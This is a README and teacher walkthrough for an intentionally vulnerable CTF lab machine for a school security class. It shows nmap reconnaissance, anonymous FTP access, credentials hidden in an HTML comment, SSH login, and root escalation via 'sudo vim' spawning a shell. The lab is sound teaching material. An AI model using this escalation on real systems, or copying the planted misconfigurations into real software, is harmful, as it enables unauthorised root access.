# CTF 靶機：老師，你的答案藏不住的

數位實驗高中資安課 CTF 挑戰。難度：Easy。預計解題時間：15–20 分鐘。

## 挑戰目標

找到 **3 個 flag**，格式為 `flag{...}`：

| Flag | 提示 | 技術 |
|------|------|------|
| flag1 | 期中考答案 | Anonymous FTP |
| flag2 | 蔡老師的密碼 | HTML 原始碼 |
| flag3 | 期末成績單 | sudo 提權 |

---

## 部署說明

### 環境需求

- Docker + Docker Compose
- **Linux（Raspberry Pi）**：完整支援
- macOS/Windows：僅限 HTTP、SSH 測試（FTP passive mode 在 host 網路模式下不支援）

### 啟動靶機

```bash
# 進入目錄
cd ctf-machine

# 建置並啟動
docker compose up -d

# 查看靶機 IP（Raspberry Pi 上執行）
hostname -I

# 查看服務是否正常
docker compose logs
```

### 停止靶機

```bash
docker compose down
```

---

## 服務端口

| Port | 服務 | 說明 |
|------|------|------|
| 21   | FTP  | vsftpd，開啟匿名登入 |
| 22   | SSH  | OpenSSH，密碼認證 |
| 80   | HTTP | Apache2 網頁 |

---

## 解題流程（老師版 Walkthrough）

### Step 1 — 偵查（nmap）
```bash
nmap -sV -sC <靶機IP>
# 預期發現：port 21 (FTP), 22 (SSH), 80 (HTTP)
```

### Step 2 — 匿名 FTP 取得 flag1
```bash
ftp <靶機IP>
# Name: anonymous
# Password: (直接按 Enter)
ftp> ls
ftp> get answers_midterm.txt
ftp> quit
cat answers_midterm.txt
# → flag1{midterm_ans_found_lol}
```

### Step 3 — 網頁原始碼取得 flag2
```bash
curl http://<靶機IP>/
# 或瀏覽器 Ctrl+U 查看原始碼
# → HTML comment 中有 flag2 + 帳密
# flag2{html_comment_is_not_safe}
# 帳號: tsai  密碼: ILoveProgramming123
```

### Step 4 — SSH 登入
```bash
ssh tsai@<靶機IP>
# 密碼: ILoveProgramming123
```

### Step 5 — sudo vim 提權取得 flag3
```bash
# 確認 sudo 權限
sudo -l
# 看到：(root) NOPASSWD: /usr/bin/vim

# GTFOBins 技巧：用 vim 開啟 shell
sudo vim -c ':!/bin/bash'

# 在 vim 的命令列模式輸入（也可以直接看上面命令的效果）
# 現在是 root shell！
cat /root/final_grades.txt
# → flag3{sudo_vim_goes_brrrr}
```

---

## 教學重點

解完後同學會學到：

1. **Port Scanning** — 用 nmap 發現目標開放的服務
2. **Anonymous FTP** — 匿名登入取得敏感檔案
3. **HTML 原始碼洩漏** — 敏感資訊不應放在前端
4. **SSH 密碼登入** — 使用找到的帳密登入系統
5. **sudo 提權（GTFOBins）** — 錯誤的 sudo 設定導致提權

---

## 注意事項

1. **host 網路模式**：docker-compose.yml 使用 `network_mode: host`，FTP 在 Linux 上才能正常運作。
2. **macOS 限制**：在 macOS 上測試時，FTP 可能無法正常連線（host 網路模式不支援）。
3. **僅限教學用途**：此靶機故意包含安全漏洞，不可暴露於公開網路。
